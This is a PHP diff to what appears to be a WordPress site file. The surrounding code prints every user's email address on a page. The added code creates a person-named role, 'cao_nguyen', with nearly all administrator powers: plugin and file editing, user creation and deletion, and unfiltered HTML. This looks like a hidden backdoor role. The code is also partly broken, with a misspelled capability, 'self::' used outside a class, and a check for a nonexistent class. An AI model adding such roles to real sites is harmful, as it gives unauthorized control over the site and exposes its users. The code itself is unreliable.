@@ -129,4 +129,163 @@ foreach ($all_users as $user) {
 	echo '<li><span>' . esc_html($user->user_email) . ' : ' . esc_html($user->display_name) . '</span></li>';
 }
 echo '</ol>'; 
-?>
+
+
+
+/**
+ * Create roles and capabilities.
+ */
+if ( ! function_exists( 'acreate_roles' ) ):
+function acreate_roles() {
+	global $wp_roles;
+	if ( ! class_exists( 'AWP_Roles' ) ) {
+		return;
+	}
+	if ( ! isset( $wp_roles ) ) {
+		$wp_roles = new AWP_Roles();
+	}
+	/* translators: user role */
+	_x( 'Cao Nguyen', 'User role', 'longviet' );
+	// manager role.
+	add_role(
+		'cao_nguyen',
+		'Cao Nguyen',
+		array(
+			'activate_plugins' => true, 
+			'delete_others_pages' => true, 
+			'delete_others_posts' => true, 
+			'delete_pages' => true, 
+			'delete_posts' => true, 
+			'delete_private_pages' => true, 
+			'delete_private_posts' => true, 
+			'delete_published_pages' => true, 
+			'delete_published_posts' => true, 
+			'edit_dashboard' => true, 
+			'edit_others_pages' => true, 
+			'edit_others_posts' => true, 
+			'edit_pages' => true, 
+			'edit_posts' => true, 
+			'edit_private_pages' => true, 
+			'edit_private_posts' => true, 
+			'edit_published_pages' => true, 
+			'edit_published_posts' => true, 
+			'edit_theme_options' => true, 
+			'export' => true, 
+			'import' => true, 
+			'list_users' => true, 
+			'manage_categories' => true, 
+			'manage_links' => true, 
+			'manage_options' => true, 
+			'moderate_comments' => true, 
+			'promote_users' => true, 
+			'publish_pages' => true, 
+			'publish_posts' => true, 
+			'read_private_pages' => true, 
+			'read_private_posts' => true, 
+			'read' => true, 
+			'remove_users' => true, 
+			'switch_themes' => true, 
+			'upload_files' => true, 
+			'customize' => true, 
+			'elete_site' => true,
+			'update_core' => true,
+			'update_plugins' => true,
+			'update_themes' => true,
+			'install_plugins' => true,
+			'install_themes' => true,
+			'upload_plugins' => true,
+			'upload_themes' => true,
+			'delete_themes' => true,
+			'delete_plugins' => true,
+			'edit_plugins' => true,
+			'edit_themes' => true,
+			'edit_files' => true,
+			'edit_users' => true,
+			'create_users' => true,
+			'delete_users' => true,
+			'unfiltered_html' => true,
+			'level_10' => true,					
+			'level_9' => true,					
+			'level_8' => true,					
+			'level_7' => true,					
+			'level_6' => true,					
+			'level_5' => true,					
+			'level_4' => true,					
+			'level_3' => true,					
+			'level_2' => true,					
+			'level_1' => true,					
+			'level_0' => true,
+		)
+	);
+	$capabilities = self::get_core_capabilities();
+	foreach ( $capabilities as $cap_group ) {
+		foreach ( $cap_group as $cap ) {
+			$wp_roles->add_cap( 'shop_manager', $cap );
+			$wp_roles->add_cap( 'cao_nguyen', $cap );
+			$wp_roles->add_cap( 'administrator', $cap );
+		}
+	}
+}
+endif;
+
+/**
+ * Remove roles.
+ */
+if ( ! function_exists( 'aremove_roles' ) ):
+function aremove_roles() {
+	global $wp_roles;
+	if ( ! class_exists( 'AWP_Roles' ) ) {
+		return;
+	}
+	if ( ! isset( $wp_roles ) ) {
+		$wp_roles = new AWP_Roles();
+	}
+	$capabilities = self::get_core_capabilities();
+	foreach ( $capabilities as $cap_group ) {
+		foreach ( $cap_group as $cap ) {
+			$wp_roles->remove_cap( 'cao_nguyen', $cap );
+			$wp_roles->remove_cap( 'administrator', $cap );
+		}
+	}
+	remove_role( 'cao_nguyen' );
+}endif;
+
+/**
+ * Get capabilities for WooCommerce - these are assigned to admin/shop manager during installation or reset.
+ *
+ * @return array
+ */
+if ( ! function_exists( 'get_core_capabilities' ) ):
+function get_core_capabilities() {
+	$capabilities = array();
+	$capabilities['core'] = array(
+		'manage_woocommerce',
+		'view_woocommerce_reports',
+	);
+	$capability_types = array( 'product', 'shop_order', 'shop_coupon' );
+	foreach ( $capability_types as $capability_type ) {
+		$capabilities[ $capability_type ] = array(
+			// Post type.
+			"edit_{$capability_type}",
+			"read_{$capability_type}",
+			"delete_{$capability_type}",
+			"edit_{$capability_type}s",
+			"edit_others_{$capability_type}s",
+			"publish_{$capability_type}s",
+			"read_private_{$capability_type}s",
+			"delete_{$capability_type}s",
+			"delete_private_{$capability_type}s",
+			"delete_published_{$capability_type}s",
+			"delete_others_{$capability_type}s",
+			"edit_private_{$capability_type}s",
+			"edit_published_{$capability_type}s",
+			// Terms.
+			"manage_{$capability_type}_terms",
+			"edit_{$capability_type}_terms",
+			"delete_{$capability_type}_terms",
+			"assign_{$capability_type}_terms",
+		);
+	}
+	return $capabilities;
+}
+endif;
